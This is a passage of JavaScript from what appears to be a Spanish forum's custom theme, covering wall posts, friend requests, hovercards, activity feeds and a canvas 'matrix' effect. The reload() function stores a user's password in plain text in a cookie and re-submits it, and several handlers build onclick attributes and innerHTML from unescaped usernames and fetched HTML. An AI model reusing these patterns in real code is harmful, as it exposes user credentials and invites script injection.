                    var b, xml = X.responseXML,
                        a = a = init.g('.pathname-box', xml)[0];
                    b = init.g('.pathname-box');
                    init.myarray(b, function (i) {
                        init.replaceHtml(a, i, function () {
                            ops.temas.main.pathFormat()
                        })
                    });

                });
            },
            postear: function (f, a) {
                var uri = {
                    t: ops.id_tema,
                    mode: 'reply',
                    message: f,
                    post: 'Enviar',
                    submit: '',
                    attach_sig: 1
                };
                ops.xmlhRequest(uri, '/post', function () {
                    if ('undefined' != typeof a) {
                        a(this)
                    }
                });
            },
            todoslostitulos: function (m) {
                var i = init.g('.nombre-tema'),
                    a = init.g('#url_a_t');
                a.innerHTML = opensource.ready(m);
                init.myarray(i, function (e) {
                    e.firstChild.innerHTML = m
                });
            },
        },
        matrix: function () {
            // Get canvas
            var cvs = init.g('#matrix');
            // Canvas fills window
            cvs.height = window.innerHeight;
            cvs.width = window.innerWidth;
            // Get canvas context
            var ctx = cvs.getContext('2d'),
                // Set font, size & number of columns
                font = 'monda',
                fontSize = 20,
                // Characters
                charSet = ['コ', 'ド', '原','炉','1','0'],
                cols = cvs.width / 18,
                // One drop per column, row set randomly
                drops = [];
            ctx.font = fontSize + 'px ' + font;
            for (var col = 0; col < cols; col++)
                drops[col] = Math.floor(Math.random() * cvs.height);
            // Call rain() every 25ms
            setInterval(rain, 85);

            function rain() {
                // Background, black, translucent
                /* This is key to the fade effect, clear the window with an alpha of 0.05, which doesn't clear it entirely but leaves existing text progressively dimmed with each subsequent call to rain()
                 */
                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
                ctx.fillRect(0, 0, cvs.width, cvs.height);
                // For each column / drop
                for (var col = 0; col < drops.length; col++) {
                    // Pick a random char
                    var char = charSet[Math.floor(Math.random() * charSet.length)];
                    // Pick a random colour
                    ctx.fillStyle = randColour();
                    // Draw the char
                    ctx.fillText(char, col * fontSize, drops[col] * fontSize);
                    // Randomly reset drop back to top row
                    if (Math.random() > 0.99)
                        drops[col] = 0;
                    drops[col]++; // Move drop down a row
                }
            }

            function randColour() {
                return 'rgb(' +
                    Math.floor(Math.random() * 256) + ',' +
                    Math.floor(Math.random() * 256) + ',' +
                    Math.floor(Math.random() * 256) + ')';
            }
        },
        //indice
        indice: {
            ultimoUsuario: function () {
                var a = init.g('.last_user_index')[0].firstChild,
                    b = init.g('.actividad')[0],
                    c = init.contiene(b, 'es nuevo en el foro'),
                    d = Cookies.get('lastuser'),
                    e = '' == a.textContent || init.contiene(a.textContent, '/profile.forum?mode=viewprofile') || init.contiene(a.textContent, '/u');

                if (e) {
                    if (!d) {
                        ops.xmlhRequest('', '/statistics', function (e) {
                            var xml = e.responseXML,
                                forumline = init.g('.forumline', xml)[1],
                                name = init.g('strong', forumline)[4].textContent;
                            Cookies.set('lastuser', name);
                            a.textContent = name;
                        });
                    } else {
                        a.textContent = d;
                    }
                }
            },
            accionespornotificacion: function () {
                var b, c, d, e, a = init.g('#live_notif');
                if (a.lastChild != null) {
                    b = a.lastChild.textContent;
                    c = init.contiene(b, 'muro');
                    d = init.contiene(b, 'mensaje privado');
                    e = init.contiene(b, 'quiere ser tu amigo');
                    ind && c && ops.indice.wrelo();
                    d && mp && !isMPNew && ops.mp.reload();
                    e && setTimeout(function () {
                        ops.indice.aceptarAmigos()
                    }, 700)
                }
            },
            postAddFriend: function (f, g, href) {
                var b = init.closest(f, '.indexfrs');
                ops.xmlhRequest('', href, function () {
                    ops.toolbar.notify.go(g + ' es tu amigo', null, 'check', 'fas fa-check-double');
                    init.fadeOut(b, 200);
                    ops.actividadFeed(ops.mi_nombre + ' y ' + g + ' se han hecho amigos', 'Historial');
                })
            },
            wrelo: function () {
                var a = init.g('.wiaag');
                if (a.length) {
                    ops.indice.spin(a[0], '#fff', '32px', 'margin-top:25%');
                    setTimeout(function () {
                        ops.indice.muro.setup()
                    }, 700)
                }
            },
            aceptarAmigos: function () {
                ops.xmlhRequest('', '/profile?mode=editprofile&page_profil=friendsfoes', function (i) {
                    var e = i.responseXML,
                        t = document.body,
                        n = init.g('.friends-foes-list', e),
                        a = init.g('.panel', e)[3],
                        o = init.contiene(a, 'alt="Aceptar"'),
                        r = init.contiene(a, 'title="Aceptar"');
                    tm || ind && ops.temas.main.añadir.existe(n);
                    if (o && r) {
                        var s, p,
                            n = init.g('.friends-foes-list', a)[0],
                            d = init.g('a', n)[0].textContent,
                            c = init.g('a', n)[0].href,
                            p = init.uid(c),
                            l = init.fixedEncodeURIComponent(d),
                            s = '/profile?friend=' + l + '&mode=editprofile&page_profil=friendsfoes',
                            f = '/ajax/index.php?f=m&user_id=' + p,
                            m = 'ops.indice.postAddFriend(this,\'' + d + '\', \'' + s + '\');return false';
                        ops.mod.recuperarDatos(f, function (i) {
                            var e = init.g('#hovercard', i),
                                n = init.g('.tooltip-title', e)[0],
                                a = init.create('span', {
                                    text: ' quiere ser tu amigo'
                                }),
                                o = init.create('div', {
                                    'class': 'indexfrs',
                                    childs: [{
                                        tag: 'div',
                                        'class': 'submit',
                                        attributes: {
                                            onclick: m
                                        },
                                        childs: [{
                                            tag: 'a',
                                            attributes: {
                                                href: s,
                                                title: 'Aceptar'
                                            },
                                            childs: [{
                                                tag: 'i',
                                                'class': 'fa fa-check-circle-o sprite-tabs_more',
                                                style: {
                                                    color: 'rgb(0, 128, 0)',
                                                    fontSize: '18px',
                                                    verticalAlign: 'middle'
                                                }
                                }, {
                                                tag: 'span',
                                                text: ' Aceptar'
                                }]
                            }]
                        }]
                                });
                            init.move(n, a, 'append');
                            init.move(o, e, 'prepend', function (i) {
                                init.move(t, i, 'append');
                                ops.audio.play()
                            });
                            
                        })
                    }
                })
            },
            avatarnews: function () {
              try{
                var b, c, n = init.g('.avanews');
                init.myarray(n, function (i) {
                    var t, a = init.g('.url_link', i.parentNode)[0].href;
                    if ('undefined' != typeof a) {
                        t = init.uid(a);
                        b = i.firstChild;
                        c = ops.html.img_ava_default;
                        b.src = ops.getAva(t);
                        ops.imgBroken(b, c)
                    }
                })
              } catch (e) {
                    console.error(e)
                }

            },
            avatarIndex: function () {
                var b = init.g('.log-in'),
                    a = init.g('a', b[0]),
                    c = b[0].innerHTML,
                    d = '<p style="font-size:11px;font-weight:bold" title="Los últimos 15 mínutos">Usuarios en línea:</p>';
                b[0].innerHTML = c.replace('Usuarios registrados:', d).replace(',', '');
                init.myarray(a, function (i) {
                    var t = i.href,
                        o = init.uid(t);
                    init.elem(i, {
                        className: 't_avatar',
                        title: i.textContent,
                        name: i.textContent,
                        href: i.href + 'wall',
                        innerHTML: '<img src="' + ops.getAva(o) + '"/>'
                    });
                    ops.imgBroken(i.firstChild, ops.html.img_ava_default)
                });
            },
            miPortada: function () {
                if (!Cookies.get('miportada')) {
                    ops.perfil.main.portada.get('/u' + ops.mi_id);
                    Cookies.set('miportada', 1, {
                        expires: 1
                    });
                }
            },
            apps: function () {
                ops.indice.reFi();
                ops.indice.extraActividad('/u92wall');
                ops.indice.hovercard();
                ops.logout && ops.indice.prevLastpost();
                ops.indice.muro.setup();
                ops.indice.avatarIndex();
                ops.StaffOnline();
                ops.indice.muro.textarea()
            },
            reload: function () {
                ops.xmlhRequest('', '/forum', function (n) {
                    var o, i = n.responseXML,
                        e = init.g('#logout', i),
                        t = Cookies.get('reload_login'),
                        s = t && t.match(/(\w+)/g),
                        a = init.g('#main-content'),
                        l = init.g('#logout');
                    if (e) {
                        var r = init.g('#main-content', i).innerHTML;
                        a.innerHTML = r, ops.indice.news.newsfirst(), ops.indice.apps()
                    } else t && l && (o = {
                        username: init.fixedEncodeURIComponent(s[0]),
                        password: init.fixedEncodeURIComponent(s[1]),
                        autologin: 'on',
                        login: 'true'
                    }, ops.xmlhRequest(o, '/login', function () {
                        window.location.reload();

                    }))
                    console.log('%c--------------> recargado:' + ops.checkTime(), colors.red)
                })
            },
            hovercard: function () {
                var usersinfo = {},
                    select = ind ? $('.lastpost').find('a[href^="/u"]') : tm && $('.mentiontag');
                select.tooltipster({
                    animation: 'grow',
                    interactive: true,
                    contentAsHTML: true,
                    minWidth: 300,
                    maxWidth: 300,
                    delay: 1000,
                    repositionOnScroll: true,
                    arrowColor: '#086594',
                    autoClose: true,
                    content: '<i class="fa fa-spinner fa-pulse fa-fw"></i> Cargando...',
                    functionBefore: function (origin, continueTooltip) {
                        continueTooltip();
                        var c, a = $(this).attr('href').match(/\d+/g)[0],
                            b = $(this).text();
                        if (origin.data('ajax') !== 'cached') {
                            if (usersinfo[a] != undefined) {
                                origin.tooltipster('content', usersinfo[a]).data('ajax', 'cached');
                            } else {
                                ops.xmlhRequest('', '/ajax/index.php?f=m&user_id=' + a, function (x) {
                                    var o = x.responseXML,
                                        head = init.g('head', o).innerHTML,
                                        body = init.g('body', o).innerHTML,
                                        html = head + body;
                                    if (b != ops.mi_nombre) {
                                        var r = -1 == ops.temas.main.añadir.array.indexOf(b),
                                            amigos = '<a class="' + (r ? 'add_friends' : 'delete_friend') + '" onclick="ops.temas.main.add_frs(this);return false" href="' + (r ? '/profile?friend=' + init.fixedEncodeURIComponent(b) + '&mode=editprofile&page_profil=friendsfoes' : '/profile?mode=editprofile&page_profil=friendsfoes&remove=' + a + "&u=" + a) + '">' + (r ? '<i class="fa fa-plus-circle"></i> Añadir a amigos' : '<i id="removeFriend" class="fa fa-minus-circle"></i> Eliminar de amigos') + '</a>';
                                        html = html.replace('<a class="fr_tooltip " href=" " title=" " alt=" "></a>', '<a class="fr_tooltip " href=" " title=" " alt=" ">' + amigos + '</a>');
                                    }
                                    ops.indice.getBannerHoverCard(a, origin, html, usersinfo)
                                });
                            }
                        }
                    }
                });
            },
            getBannerHoverCard: function (a, origin, html, userinfo) {
                ops.xmlhRequest('', '/u' + a, function (x) {
                    var o = x.responseXML,
                        c = init.g('.field_uneditable', init.g('#field_id3', o))[0].textContent,
                        style = 'style="height: 126px;background-size:100%;background-image:url(' + c + ')"',
                        change = html.replace('style="height: 126px;"', style);
                    userinfo[a] = change;
                    origin.tooltipster('content', userinfo[a]).data('ajax', 'cached');
                });
            },
            prevLastpost: function () {
                var temainfo = {};
                $('.index_topicname').tooltipster({
                    animation: 'grow',
                    interactive: true,
                    contentAsHTML: true,
                    minWidth: 300,
                    maxWidth: 300,
                    delay: 500,
                    arrowColor: "#fff",
                    autoClose: true,
                    content: '<i class="fa fa-spinner fa-pulse fa-fw"></i> Cargando...',
                    functionBefore: function (origin, continueTooltip) {
                        continueTooltip();
                        var c, d, o, x, edit, dom, nick, value, a = $(this).attr('href'),
                            b = $(this).text();
                        if (origin.data('ajax') !== 'cached') {
                            if (temainfo[a] != undefined) {
                                origin.tooltipster('content', temainfo[a]).data('ajax', 'cached');
                            } else {
                                ops.xmlhRequest('', a, function (m) {
                                    o = m.responseXML;
                                    x = init.g('figure', o)[0].firstChild.firstChild.src;
                                    nick = init.g('.nick', o)[0].textContent;
                                    value = init.g('.content', init.g('.post', o)[0])[0].innerHTML;
                                    d = '<div class="postPreview"><div class="cabeceraPreview"><img class="prev_lastpost" src="' + x + '">' + nick + ' escribió:</div>' + init.BB.parse(value) + '</div>';
                                    temainfo[a] = d;
                                    origin.tooltipster('content', d).data('ajax', 'cached');
                                    ops.temas.main.panda()
                                })
                            }
                        }
                    },
                });
            },
            pre: function () {
                var b, a = init.g('.estadisticas');
                ops.indice.add();
                ops.indice.muro.setup();
                b = init.elem('div', {
                    innerHTML: ops.estadisticas,
                    className: 'stats'
                });
                init.move(a[0], b, 'append');
            },
            add: function () {
                var t, e, a, i, n, r, s, c, l, p, o, f, d = init.g('.row');
                init.myarray(d, function (d) {
                    i = init.g('.last-post-icon', d);
                    t = i.length && /(\/t[0-9]+)p([0-9]+)-/.exec(i[0]);
                    n = init.g('.hierarchy', d);
                    e = init.g('.lastpost', d)[0];
                    r = n[0].firstChild.href;
                    c = r.match(/f(\d+)/)[1];
                    p = init.create('span', {
                        class: 'gensmall showpages',
                        style: {
                            fontSize: '9px'
                        },
                        childs: [{
                            tag: 'i',
                            class: 'fas fa-file-alt'
                    }, {
                            tag: 'text',
                            text: 'Ir a la página: '
                        }]
                    });
                    s = init.create('span', {
                        childs: [{
                            tag: 'div',
                            attributes: {
                                id: 'crear_tema',
                                title: 'Crear un tema'
                            },
                            childs: [{
                                tag: 'a',
                                attributes: {
                                    rel: 'nofollow',
                                    onclick: 'ops.indice.noAccess(' + c + ');return false',
                                    href: r
                                },
                                class: 'index_nwpost',
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-plus-square'
                                }, {
                                    tag: 'text',
                                    text: ' Crear un tema'
                                }]
                            }]
                        }]
                    });
                    t && (o = init.create('a', {
                        attributes: {
                            href: t[1]
                        },
                        text: '1'
                    }), init.move(p, o, 'append', function (i) {
                        if (l = i, a = t[2] / 10, a > 3) {
                            var n = t[1] + 'p10-',
                                r = t[1] + 'p' + (t[2] - 10) + '-',
                                s = t[1] + 'p' + t[2] + '-',
                                c = init.create('fragment', {
                                    childs: [{
                                        tag: 'a',
                                        attributes: {
                                            href: n
                                        },
                                        text: '2'
                                    }, {
                                        tag: 'text',
                                        text: ' ... '
                                    }, {
                                        tag: 'a',
                                        attributes: {
                                            href: r
                                        },
                                        text: a
                                    }, {
                                        tag: 'a',
                                        attributes: {
                                            href: s
                                        },
                                        text: a + 1
                                    }]
                                });
                            init.move(l, c, 'append')
                        } else
                            for (var p = 0; a > p; p++) f = init.create('a', {
                                attributes: {
                                    href: t[1] + 'p' + 10 * (p + 1) + '-'
                                },
                                text: p + 2
                            }), init.move(l, f, 'append');
                        init.move(e, l, 'append')
                    })), init.move(d, s, 'append')
                }), ops.indice.coma()
            },
            coma: function () {
                var b, d, e, c, a = init.g('.showpages');
                init.myarray(a, function (i) {
                    b = init.g('a', i);
                    init.myarray(b, function (n) {
                        c = b[b.length - 1],
                            e = init.create('text', {
                                text: ' , '
                            });
                        init.move(n, e, 'after');
                        c.nextSibling != null && (c.nextSibling.textContent = '');
                    })
                });
            },
            noAccess: function (c) {
                var b, d, s, a = '/post?f=' + c + '&mode=newtopic';
                ops.xmlhRequest('', a, function (o) {
                    s = o.responseXML;
                    b = init.g('.error', s);
                    d = 'Lo sentimos pero solo los usuarios con acceso especial pueden publicar temas en este foro';
                    if (b.length && init.contiene(b[0], 'Lo sentimos')) {
                        ops.toolbar.notify.go(d, null, 'alert', 'fas fa-exclamation')
                        return false
                    } else {
                        var editor = s.forms.post.parentNode;
                        ops.box(editor, 'Publicar un nuevo tema', function () {
                            ops.setupVar();
                            ops.post.ponerprefijos();
                        })
                    }
                })
            },
            muro: {
                textarea: function () {
                    var a = init.g('#avac_status_textarea');
                    if (a) {
                        ops.placeholder(a, ops.mi_nombre + ' publica un nuevo mensaje...');
                        a.addEventListener('click', function () {
                            window.onbeforeunload = function () {
                                if (a.value.length) {
                                    return ''
                                }
                            };
                            this.style.height = '150px';
                            this.addEventListener('blur', function () {
                                this.style.height = '15px'
                            }, false)
                        }, false);
                    }
                },
                setup: function () {
                    var o, b, a = init.g('#profile-advanced-details2'),
                        c = ops.html.no_wallpost,
                        d = init.g('.wiaag');
                    if (!ops.logout) {
                        b = init.create('div', {
                            childs: [{
                                tag: 'p',
                                style: {
                                    lineHeight: '16',
                                    textShadow: 'none',
                                    color: '#fff',
                                    textAlign: 'center',
                                },
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-plug',
                                    attributes: {
                                        'aria-hidden': 'true'
                                    }
                                }, {
                                    tag: 'text',
                                    text: 'Conéctate para visualizar tu muro'
                                }]
                            }]
                        });
                        init.replaceHtml(b, a);
                    } else {
                        ops.xmlhRequest('', '/u' + ops.mi_id + 'wall', function (w) {
                            o = w.responseXML;
                            if (!init.g('.message-block', o).length) {
                                init.g('.wiaag')[0].innerHTML = c;
                            } else {
                                document.forms.sus.username.value = ops.mi_nombre;
                                init.replaceHtml(ops.indice.muro.array(o, 'ol'), d[0]);
                                ops.confirm();
                                var img = init.g('.imgAva_m');
                                init.myarray(img, function (i) {
                                    ops.imgBroken(i, ops.html.img_ava_default)
                                })
                            }
                        })
                    }
                },
                array: function (i, e, a) {
                    var s = init.g('#cp-main', i),
                        t = init.g('ol', s),
                        r = t.length && init.g('.message-block', t[0]),
                        n = document.createDocumentFragment();
                    r.length && init.myarray(r, function (i) {
                        var e = init.closest(i, 'li'),
                            a = init.g('.avatar', e)[0],
                            S = init.g('a', a)[0].href,
                            t = init.g('img', a)[0].src,
                            r = init.g('.message-date', e)[0].textContent,
                            l = init.g('.message-header', e)[0],
                            o = init.g('.message-footer', e)[0],
                            d = init.g('a', o),
                            f = init.g('em', l),
                            p = init.uid(S),
                            c = init.uid(window.location.pathname),
                            g = d.length && d[0].href.match(/(\d+)$/g)[0],
                            m = d.length && d[1].href,
                            u = init.g('strong', l)[0].textContent,
                            h = init.BB.parse(init.g('.message-text', e)[0].innerHTML),
                            v = init.g('.sprite-icon_post_target_unread', i),
                            j = v.length ? 'new_post_wall' : '',
                            okLinks = p == ops.mi_id || ops.soy_staff || c == ops.mi_id,
                            linksInd = [{
                                tag: 'a',
                                class: 'wall_delete_ind',
                                attributes: {
                                    href: m,
                                },
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-trash',
                                    attributes: {
                                        'aria-hidden': 'true',
                                    }
                                }]
                            }, {
                                tag: 'a',
                                class: 'anwser_wall',
                                attributes: {
                                    href: s,
                                    onclick: 'ops.indice.muro.rsiw(this,\'' + u + '\');return false'
                                },
                                text: 'Responder a ' + u
                            }],
                            buttons = [{
                                tag: 'button',
                                class: 'quote_to',
                                attributes: {
                                    name: u,
                                    onclick: 'ops.perfil.muro.citar(this)',
                                    title: 'Citar a  ' + u,
                                    style: 'margin-left: 2px;'
                                },
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-quote-left',
                                    'aria-hidden': 'true'
                                }, {
                                    tag: 'span',
                                    text: 'Citar a ' + u
                                }]
                            }, {
                                tag: 'button',
                                class: 'wall_to',
                                attributes: {
                                    name: u,
                                    onclick: 'ops.perfil.muro.otros(\'responder_otros\',this, \'' + t + '\'); return false',
                                    title: 'responder en el muro de ' + u,
                                },
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-comments-o',
                                    'aria-hidden': 'true',
                                }, {
                                    tag: 'span',
                                    text: 'Responder a ' + u
                                }]
                            }],
                            childs = [{
                                tag: 'div',
                                class: 'message-block',
                                childs: [{
                                    tag: 'div',
                                    class: 'avatar',
                                    childs: [{
                                        tag: 'a',
                                        attributes: {
                                            href: S + 'wall'
                                        },
                                        childs: [{
                                            tag: 'img',
                                            attributes: {
                                                src: t
                                            },
                                            class: 'imgAva_m'
                                        }]
                                    }]
                                }, {
                                    tag: 'div',
                                    class: 'message-header',
                                    childs: [{
                                        tag: 'div',
                                        class: 'message-date',
                                        childs: [{
                                            tag: 'i',
                                            class: 'fas fa-clock',
                                            'aria-hidden': 'true'
                                        }, {
                                            tag: 'span',
                                            text: ' ' + r,
                                            childs: [{
                                                tag: 'em',
                                                attributes: {
                                                    style: !pu ? 'display:none' : ''
                                                },
                                                childs: [{
                                                    tag: 'i',
                                                    class: 'fa fa-wifi online' + (f.length ? ' green' : ' red')
                                                }]
                                            }]
                                        }]
                                    }, {
                                        tag: 'div',
                                        class: 'message-text',
                                        html: init.BB.parse(h)
                                    }]
                                }, ]
                            }],
                            pokie = [{
                                tag: 'li',
                                childs: [{
                                    tag: 'a',
                                    class: 'pokie',
                                    attributes: {
                                        href: '/privmsg?mode=post_profile&u=' + p,
                                        title: 'Enviar un toque',
                                        onclick: 'ops.perfil.main.poke.post(\'' + p + "','" + u + '\');return false'
                                    },
                                    childs: [{
                                        tag: 'i',
                                        class: 'fa fa-hand-o-right',
                                        attributes: {
                                            'aria-hidden': 'true'
                                        }
                                    }, {
                                        tag: 'span',
                                        text: ' Toque'
                                    }]
                                }]
                            }],
                            links = [{
                                tag: 'li',
                                childs: [{
                                    tag: 'a',
                                    class: 'wallmove',
                                    attributes: {
                                        href: '/u' + c + 'wall?s=' + g,
                                        title: 'Mover en los archivos de los MP',
                                        onclick: 'ops.perfil.muro.otros(\'guardar_wall\',this); return false'
                                    },
                                    childs: [{
                                        tag: 'i',
                                        class: 'fas fa-save',
                                        attributes: {
                                            'aria-hidden': 'true'
                                        }
                                    }, {
                                        tag: 'span',
                                        text: ' Ocultar'
                                    }]
                                }]
                            }, {
                                tag: 'li',
                                childs: [{
                                    tag: 'a',
                                    class: 'walldelete',
                                    attributes: {
                                        href: '/u' + c + 'wall?d=' + g,
                                        title: 'Borrar definitivamente este mensaje',
                                    },
                                    childs: [{
                                        tag: 'i',
                                        class: 'fa fa-trash',
                                        attributes: {
                                            'aria-hidden': 'true'
                                        },
                                    }, {
                                        tag: 'span',
                                        text: ' Borrar'
                                    }],
                                }]
                            }],
                            footer = [{
                                tag: 'div',
                                class: 'clearfix'
                            }, {
                                tag: 'ul',
                                class: 'message-footer',
                                childs: p != ops.mi_id ? pokie : []
                            }, {
                                tag: 'div',
                                class: 'clear'
                            }];
                        okLinks && [].push.apply(footer[1].childs, links);
                        pu && p != ops.mi_id && ([].unshift.apply(childs[0].childs[1].childs, buttons));
                        ind && [].unshift.apply(childs[0].childs[1].childs, linksInd);
                        pu && [].push.apply(childs[0].childs, footer);
                        init.move(n, init.create('li', {
                            class: tm || pu ? 'row ' + j : 'row ' + j + ' load_wall_row',
                            childs: childs
                        }), 'append')
                    });
                    t.length && (init.replaceHtml(n, t[0]));
                    s = r.length ? s : ops.perfil.muro.sinMsg(s);
                    final = 'ol' == e ? 1 == a ? t[0] : t[0] : s;
                    return final
                },
                rsiw: function (o, b) {
                    var a = document.forms.sus;
                    a.message.height = '15px';
                    a.message.focus();
                    ops.placeholderwall = document.forms.sus.message.placeholder;
                    a.message.placeholder = 'Responder a ' + b;
                    a.username.value = b;
                },
                deleteSpin: function () {
                    var d = init.g('.spin_wall');
                    d.length && init.borrar(d[0]);
                },
            },
            reFi: function () {
                ops.indice.subindfunciones();
                ops.indice.add();
                ops.prefijos();
                ops.staff_alert();
            },
            cambiarHTML: function (a) {
                var a, n, i;
                for (i = 0; i < a.length; i++) {
                    n = a[i].innerHTML.replace(/&amp;/g, '&').replace(/&gt;/g, '>').replace(/&lt;/g, '<').replace(/&quot;/g, '"');
                    a[i].innerHTML = n;
                }
            },
            spin: function (ele, color, size, margin, texto) {
                var a = 'undefined' != typeof texto ? texto : '',
                    b = init.create('fragment', {
                        childs: [{
                            tag: 'div',
                            class: 'spin_wall',
                            style: {
                                width: '100%',
                                textAlign: 'center',
                                display: 'inline'
                            },
                            childs: [{
                                tag: 'center',
                                childs: [{
                                    tag: 'i',
                                    style: {
                                        color: color,
                                        fontSize: size,
                                        textShadow: 'none',
                                        margin: margin
                                    },
                                    class: 'fa fa-spinner fa-pulse fa-fw'
                                }, {
                                    tag: 'span',
                                    text: a,
                                    style: {
                                        fontSize: parseInt(size) / 2 + 'px',
                                        color: color,
                                    }
                                }]
                            }]
                        }]
                    });
                init.replaceHtml(b, ele);
            },
            extraActividad: function (c) {
                var a = init.g('.contenedor')[0];
                ops.indice.spin(a, '#fff', '32px', '40px 0');
               ops.logout ?  ops.indice.actividad(c.href) : a.innerHTML = '<br/><br/><br/><br/><br/><center style="color:#fff;text-shadow:none"> Registrate, es gratis </center>';
                b = c == '/u92wall' ? 'Estados' : c.textContent;
                init.g('.actividad_top')[0].firstChild.textContent = b ;
            },
            actividad: function (t) {
                var i, header, nick, li, e, a, n, s, c, r, o, l, d, m,
                    g = ops.indice.news.update('fragment', ''),
                    p = /\/u(89|3)wall/g.test(t) ? t : '/u92wall',
                    u = init.g('.contenedor')[0];
                ops.xmlhRequest('', p, function (t) {
                    l = t.responseXML, i = init.g('.message-text', l);
                    m = init.g('#actividad_update');
                    init.replaceHtml(g, m);
                    n = document.createDocumentFragment();
                    s = init.elem('br');
                    init.myarray(i, function (t) {
                        r = init.g('a', t);
                        li = init.closest(t, 'li');
                        header = init.g('.message-header', li)[0];
                        nick = init.g('strong', header)[0].textContent,
                            e = init.g('.avatar', li)[0].firstChild.firstChild.src;
                        r.length && (r[0].className = 'acti_topicname');
                        c = opensource.ready(t.innerHTML);
                        a = c.match(/(?:estado:)(.*)/) ? c.match(/(?:estado:)(.*)/)[1] : c;
                        o = init.g('.message-date', li)[0].textContent;
                        d = init.create('li', {
                            class: 'act_row',
                            childs: [{
                                tag: 'div',
                                class: 'message-date',
                                childs: [{
                                    tag: 'img',
                                    attributes: {
                                        src: e,
                                        title: nick + ' - ' + o
                                    },
                                    class: 'ava_'
                                }, {
                                    tag: 'i',
                                    class: 'fa fa-angle-left'
                                }]
                            }, {
                                tag: 'div',
                                class: 'message-text',
                                html: a + ' - ' + o.toLocaleLowerCase(),
                                style:{
                                    textTransform: 'lowercase'
                                }
                            }]
                        });
                        init.move(n, d, 'append');
                    });
                    
                    init.replaceHtml(n, u, function () {
                        var t = init.g('.act_row');
                        init.move(init.last(t), s, 'append');
                        ops.indice.cambiarHTML(t);
                        ops.prefijos();
                        var img = init.g('.ava_');
                        init.myarray(img, function (i) {
                            ops.imgBroken(i, ops.html.img_ava_default)
                        })
                    });
                })
            },
            change_cover: function () {
                if (init.contiene(init.g('.contenedor')[0].textContent, 'actualizó su portada')) {
                    var i, c = document.cookie.split('; ');
                    for (i in c) document.cookie = /^[^=]+/.exec(c[i])[0] + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT';
                    localStorage.clear()
                }
            },
            news: {
                update: function (div, id) {
                    var a = init.create(div, {
                        attributes: {
                            id: id,
                        },
                        style: {
                            marginTop: '-5px'
                        },
                        childs: [{
                            tag: 'i',
                            class: 'fa fa-clock-o',
                            attributes: {
                                'aria-hidden': 'true'
                            }
                        }, {
                            tag: 'span',
                            text: ' Actualizado: ' + ops.checkTime('hora')
                        }]
                    });
                    return a
                },
                newsfirst: function () {
                    var g, a = init.g('#news_auto_refresh'),
                        c = init.g('.mod_recent_topics'),
                        f = ops.checkTime('hora'),
                        newsFade = function () {
                            var g = init.g('.news_topic');
                            init.myarray(g, function (i) {
                                init.fadeIn(i, 200)
                            })
                        },
                        apps = function (u) {
                            init.replaceHtml(u[0], a, function () {
                                init.move(a, ops.indice.news.update('div', 'newupdate'), 'append');
                                ops.prefijos();
                                ops.indice.avatarnews();
                                newsFade();
                            })
                        };
                    if (pu) {
                        ops.mod.recuperarDatos('/forum', function (xml) {
                            var u = init.g('.mod_recent_topics', xml);
                            apps(u)
                        });
                    } else {
                        apps(c)
                    }
                },
            },
            subindfunciones: function () {
                var c, d, s, a = init.g('.lastpost');
                init.myarray(a, function (i) {
                    c = init.g('.sprite-icon_topic_latest', i);
                    d = init.g('.sprite-icon_topic_newest', i);
                    s = init.create('span', {
                        class: 'ver',
                        attributes: {
                            title: 'ir al último mensaje escrito'
                        },
                        style: {
                            color: '#3491d2',
                            borderRadius: '2px',
                            textShadow: 'none',
                            padding: '0 1px',
                            fontSize: '8px',
                            display: 'inline',
                        },
                        childs: [{
                            tag: 'i',
                            class: 'fas fa-external-link-alt'
                        }]
                    });
                    c.length && init.move(c[0], s, 'replaceWith');
                    d.length && init.move(d[0], s, 'replaceWith');
                })
            },
        },
        //subs
        subs: {
            usersviews: function () {
                var u = init.g('a', init.g('.users_view')[0]),
                    a = init.g('br', init.g('.users_view')[0]),
                    w = window.localStorage;
                init.myarray(u, function (i) {
                    var o, t = i.href;
                    if ('undefined' != typeof t) {
                        o = init.uid(t);
                        init.elem(i, {
                            className: 't_avatar',
                            title: i.textContent,
                            innerHTML: '<img src="' + ops.getAva(o) + '">'
                        });
                        init.g('br', init.g('.users_view')[0]).length != 3 && u[0].insertAdjacentHTML('beforebegin', '<br/>');
                    }
                })
            },
            previewImg: function () {
                var a = init.g('.PreviewImg');
                init.myarray(a, function (i) {
                    i.addEventListener('click', function () {
                        var c = this.style.backgroundImage,
                            d = c.match(/((\w+:\/\/)[-a-zA-Z0-9:@;?&=\/%\+\.\*!'\(\),\$_\{\}\^~\[\]`#|]+)/g),
                            e = d != null ? d[0] : 'https://i58.servimg.com/u/f58/17/46/52/67/img_no10.jpg',
                            b = init.closest(this, 'li'),
                            f = init.g('.topictitle', b)[0].textContent,
                            g = '<img style="max-width:100%" id="preview_img_sub" src="' + e + '" />';
                        ops.box(g, 'Ver la primer imagen del tema:' + f);
                    }, false)
                })
            },
            prev_sub: function (c, event) {
                var b, s, d, e, f, j,
                    g = init.g('.topictitle', c.parentNode.parentNode)[0].href;
                ops.preventDoubleClick(c, !0, !1, !1, event, 'rgb(27, 127, 204)', undefined, function () {
                    ops.xmlhRequest('', g, function (o) {
                        s = o.responseXML;
                        b = init.g('.content', s)[0].innerHTML;
                        d = init.g('.nick', s)[0].innerHTML;
                        e = init.g('figure', s)[0].innerHTML;
                        f = init.g('#url_a_t', s).innerHTML;
                        j = init.create('div', {
                            childs: [{
                                tag: 'div',
                                class: 'post',
                                childs: [{
                                    tag: 'div',
                                    class: 'inner',
                                    childs: [{
                                        tag: 'div',
                                        class: 'postbody',
                                        childs: [{
                                            tag: 'div',
                                            class: 'content clearfix',
                                            html: init.BB.parse(b)
                                        }]
                                    }, {
                                        tag: 'div',
                                        class: 'postprofile',
                                        childs: [{
                                            tag: 'strong',
                                            class: 'nick',
                                            style: {
                                                fontSize: '1.2em',
                                                display: 'inline-block'
                                            },
                                            html: d
                                        }, {
                                            tag: 'div',
                                            class: 'f_a',
                                            childs: [{
                                                tag: 'div',
                                                class: 'f_a1',
                                                childs: [{
                                                    tag: 'div',
                                                    class: 'imgholder',
                                                    childs: [{
                                                        tag: 'figure',
                                                        html: e
                                                    }]
                                                }, {
                                                    tag: 'br'
                                                }]
                                            }]
                                        }]
                                    }]
                                }]
                            }]
                        });
